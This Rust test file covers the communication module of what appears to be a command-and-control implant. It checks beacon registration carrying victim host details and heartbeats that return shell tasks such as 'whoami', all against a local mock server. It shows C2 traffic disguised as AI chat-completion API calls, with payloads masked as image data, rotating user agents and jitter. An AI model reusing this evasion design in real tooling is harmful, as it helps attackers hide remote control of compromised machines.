//! Integration tests for the HTTP communicator against an in-process mock server.
//!
//! Covers the three registration modes and the AI-channel heartbeat path:
//! - plaintext registration (no beacon secret, no injected server key)
//! - single-entry encrypted registration (pre-session key envelope)
//! - heartbeat with a pending task delivered over the fake SSE stream

use std::io::{Read, Write};
use std::net::TcpListener;
use std::thread;

use libra_comm::http::HttpCommunicator;
use serde_json::{json, Value};

// ── Minimal in-process HTTP/1.1 mock server ────────────────────────────

struct MockServer {
    addr: String,
    handle: Option<thread::JoinHandle<()>>,
}

impl MockServer {
    /// Start a server that handles `requests` requests, each answered by `handler`.
    /// Handler returns `(status, body)`.
    fn start<F>(requests: usize, handler: F) -> Self
    where
        F: Fn(&[u8]) -> (u16, String) + Send + 'static,
    {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind mock server");
        let addr = listener.local_addr().expect("local addr");
        let handle = thread::spawn(move || {
            for _ in 0..requests {
                let (mut stream, _) = listener.accept().expect("accept");
                let req = read_http_request(&mut stream);
                let (status, body) = handler(&req);
                let reason = if status == 200 { "OK" } else { "ERR" };
                let resp = format!(
                    "HTTP/1.1 {status} {reason}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(resp.as_bytes());
            }
        });
        Self {
            addr: format!("http://{addr}"),
            handle: Some(handle),
        }
    }
}

impl Drop for MockServer {
    fn drop(&mut self) {
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
    }
}

fn read_http_request(stream: &mut impl Read) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut tmp = [0u8; 4096];
    loop {
        let n = stream.read(&mut tmp).expect("read request");
        if n == 0 {
            break;
        }
        buf.extend_from_slice(&tmp[..n]);
        if let Some(pos) = find_header_end(&buf) {
            let head = String::from_utf8_lossy(&buf[..pos]);
            let content_length = head
                .lines()
                .find_map(|l| {
                    l.to_ascii_lowercase()
                        .strip_prefix("content-length:")
                        .map(|v| v.trim().parse::<usize>().unwrap_or(0))
                })
                .unwrap_or(0);
            if buf.len() >= pos + 4 + content_length {
                break;
            }
        }
    }
    buf
}

fn find_header_end(buf: &[u8]) -> Option<usize> {
    buf.windows(4).position(|w| w == b"\r\n\r\n")
}

fn body_of(req: &[u8]) -> &str {
    let pos = find_header_end(req).expect("header end") + 4;
    std::str::from_utf8(&req[pos..]).expect("utf-8 body")
}

fn request_line(req: &[u8]) -> String {
    let head_end = find_header_end(req).expect("header end");
    String::from_utf8_lossy(&req[..head_end])
        .lines()
        .next()
        .unwrap_or("")
        .to_string()
}

// ── Tests ───────────────────────────────────────────────────────────────

#[tokio::test]
async fn register_plaintext_parses_outcome() {
    let server = MockServer::start(1, |req| {
        let line = request_line(req);
        assert!(
            line.contains("POST /api/v1/reg"),
            "unexpected request: {line}"
        );
        // Plaintext registration body must carry the agent fields.
        let body: Value = serde_json::from_str(body_of(req)).expect("json body");
        assert_eq!(body["hostname"], "mock-host");
        assert_eq!(body["userName"], "mock-user");
        assert_eq!(body["osVersion"], "Windows 11");
        assert_eq!(body["arch"], "x64");
        assert_eq!(body["pid"].as_i64().unwrap() > 0, true);
        (
            200,
            json!({
                "agent_id": "agent-123",
                "session_token": "tok-abc",
                "session_key": "",
                "profile": {
                    "entryPath": "/api/beacon",
                    "pathSuffixes": ["/asset/1.png", "/asset/2.png"],
                    "dataKey": "d",
                    "tsKey": "ts",
                    "randKey": "r",
                    "signKey": "sig",
                    "tokenKey": "sid",
                    "userAgents": ["UA-1", "UA-2"],
                    "paddingMin": 1,
                    "paddingMax": 8,
                    "heartbeatIntervalMs": 30_000,
                    "jitterPercent": 0.1,
                    "aiPath": "/v1/chat/completions",
                    "aiModels": ["gpt-4o-mini"],
                    "authPrefix": "sk-"
                },
                "heartbeat_interval_ms": 30_000,
                "jitter_percent": 0.1
            })
            .to_string(),
        )
    });

    let mut comm = HttpCommunicator::new(&server.addr, "/api/v1/reg", "/hb", "/res");
    let out = comm
        .register(
            "mock-host",
            "mock-user",
            "Windows 11",
            "x64",
            "pub-key",
            "",
            "{}",
            false,
        )
        .await
        .expect("register ok");

    assert_eq!(out.agent_id, "agent-123");
    assert_eq!(out.session_token.as_deref(), Some("tok-abc"));
    assert_eq!(out.heartbeat_interval_ms, 30_000);
    assert!((out.jitter_percent - 0.1).abs() < 1e-9);
    let profile = out.profile.expect("profile");
    assert_eq!(profile.entry_path, "/api/beacon");
    assert_eq!(
        profile.user_agents,
        vec!["UA-1".to_string(), "UA-2".to_string()]
    );
    assert_eq!(profile.ai_models, vec!["gpt-4o-mini".to_string()]);
}

#[tokio::test]
async fn register_envelope_encrypted_with_pre_session_key() {
    const SECRET: &str = "beacon-secret-1";
    let server = MockServer::start(1, |req| {
        let line = request_line(req);
        assert!(
            line.contains("POST /api/v1/reg"),
            "unexpected request: {line}"
        );
        let body: Value = serde_json::from_str(body_of(req)).expect("json body");
        // Shell must use profile default keys with a ciphertext payload.
        let cipher = body["d"].as_str().expect("data key");
        assert!(body["ts"].is_number(), "timestamp field");
        assert!(body["r"].is_string(), "random field");
        // Decrypt the envelope with the pre-session key derived from the secret.
        let key = libra_crypto::derive_pre_session_key(SECRET);
        let plain = libra_crypto::decrypt_payload(cipher, &key).expect("decrypt envelope");
        let env: Value = serde_json::from_str(&plain).expect("envelope json");
        assert_eq!(env["op"], "reg");
        let data: Value = serde_json::from_str(env["data"].as_str().expect("data string"))
            .expect("register data json");
        assert_eq!(data["hostname"], "enc-host");
        assert_eq!(data["publicKey"], "enc-pub");
        (
            200,
            json!({ "agent_id": "agent-enc", "session_token": "tok-enc" }).to_string(),
        )
    });

    let mut comm = HttpCommunicator::new(&server.addr, "/api/v1/reg", "/hb", "/res");
    let out = comm
        .register(
            "enc-host", "enc-user", "os", "x64", "enc-pub", SECRET, "{}", false,
        )
        .await
        .expect("register ok");

    assert_eq!(out.agent_id, "agent-enc");
    assert_eq!(out.session_token.as_deref(), Some("tok-enc"));
}

#[tokio::test]
async fn heartbeat_parses_pending_task_from_ai_channel() {
    let key = libra_crypto::generate_aes_key();
    let server = MockServer::start(1, move |req| {
        let line = request_line(req);
        assert!(
            line.contains("POST /v1/chat/completions"),
            "unexpected request: {line}"
        );
        let body: Value = serde_json::from_str(body_of(req)).expect("json body");
        let content = body["messages"][0]["content"].as_str().expect("content");
        let cipher = content
            .strip_prefix("data:image/jpeg;base64,")
            .expect("masked payload");
        let plain = libra_crypto::decrypt_payload(cipher, &key).expect("decrypt heartbeat");
        let env: Value = serde_json::from_str(&plain).expect("envelope json");
        assert_eq!(env["op"], "hb");
        assert_eq!(env["id"], "tok-hb");

        // Respond with an SSE stream carrying an encrypted pending task.
        let task = json!({ "pendingTask": {
            "id": "task-9",
            "agentId": "agent-1",
            "commandType": "Shell",
            "command": "whoami",
            "status": "Pending",
            "timeoutSeconds": 30
        }});
        let cipher_resp = libra_crypto::encrypt_payload(&task.to_string(), &key);
        let sse = format!(
            "data: {{\"choices\":[{{\"delta\":{{\"content\":\"{cipher_resp}\"}}}}]}}\r\ndata: [DONE]\r\n"
        );
        (200, sse)
    });

    let mut comm = HttpCommunicator::new(&server.addr, "/api/v1/reg", "/hb", "/res");
    comm.set_session_token("tok-hb".to_string());
    let task = comm
        .heartbeat("agent-1", Some(&key))
        .await
        .expect("heartbeat ok");

    let task = task.expect("pending task");
    assert_eq!(task.id, "task-9");
    assert_eq!(task.agent_id, "agent-1");
    assert_eq!(task.command, "whoami");
    assert_eq!(task.timeout_seconds, 30);
}

#[tokio::test]
async fn heartbeat_no_pending_task_returns_none() {
    let key = libra_crypto::generate_aes_key();
    let server = MockServer::start(1, move |req| {
        let _ = req;
        let plain = json!({});
        let cipher_resp = libra_crypto::encrypt_payload(&plain.to_string(), &key);
        let sse = format!(
            "data: {{\"choices\":[{{\"delta\":{{\"content\":\"{cipher_resp}\"}}}}]}}\r\ndata: [DONE]\r\n"
        );
        (200, sse)
    });

    let mut comm = HttpCommunicator::new(&server.addr, "/api/v1/reg", "/hb", "/res");
    comm.set_session_token("tok-none".to_string());
    let task = comm
        .heartbeat("agent-1", Some(&key))
        .await
        .expect("heartbeat ok");
    assert!(task.is_none());
}
